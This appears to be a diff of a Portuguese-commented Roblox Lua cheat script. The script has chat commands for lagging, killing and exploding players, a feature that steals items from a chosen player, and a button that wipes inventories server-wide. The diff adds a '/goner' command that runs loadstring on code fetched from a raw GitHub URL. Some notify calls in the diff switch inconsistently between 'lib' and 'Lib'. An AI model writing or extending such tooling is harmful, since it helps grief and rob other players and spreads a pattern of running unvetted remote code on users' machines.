@@ -250,6 +250,7 @@ if AdminNames then
     {"/lag", "lag"},
     {"/genkidama", "genkidama"},
     {"/bring", "bring"},
+    {"/goner", "goner"},
     {"/explode", "explode"} -- Adicionado aqui
 }
 
@@ -485,6 +486,24 @@ TextChatService.MessageReceived:Connect(function(msg)
                 task.delay(3, function() if sound then sound:Destroy() end end)
             end  
 
+ 
+        elseif cmd == "goner" then
+    -- Se o alvo for você (ou quando você usar o "todos")
+    if victim == localPlayer then
+        task.spawn(function()
+            -- Pequeno delay para sincronia
+            task.wait(0.1)
+            
+            -- O pcall serve para o seu script não crashar se o link estiver offline
+            local success, err = pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Dboas123432sx/personagem/refs/heads/main/goner"))()
+            end)
+            
+            if not success then
+                warn("Erro ao carregar script: " .. tostring(err))
+            end
+        end)
+    end
 
         -- [[ COMANDOS EXTRAS ]]
         elseif cmd == "kill" then if hum then hum.Health = 0 end
@@ -3136,7 +3155,7 @@ MainTab:AddButton({
     Callback = function()
         if _G.SelectedPlayer ~= "" then
             iniciarProcessoDeRoubo(_G.SelectedPlayer)
-            Window:Notify({
+            lib:Notify({
                 Title = "Executando", 
                 Content = "Roubando de: " .. _G.SelectedPlayer, 
                 Duration = 3
@@ -3159,7 +3178,7 @@ MainTab:AddButton({
                 iniciarProcessoDeRoubo(p.Name)
             end
         end
-        Window:Notify({Title = "Global", Content = "Limpando inventários do servidor...", Duration = 3})
+        Lib:Notify({Title = "Global", Content = "Limpando inventários do servidor...", Duration = 3})
     end
 })
                                     
@@ -6308,6 +6327,7 @@ task.spawn(function()
         RE:WaitForChild("1RPNam1eColo1r", 9e9):FireServer("PickingRPBioColor", Color3.fromRGB(255, 19, 3))
     end)
 end)
+
 
 
 
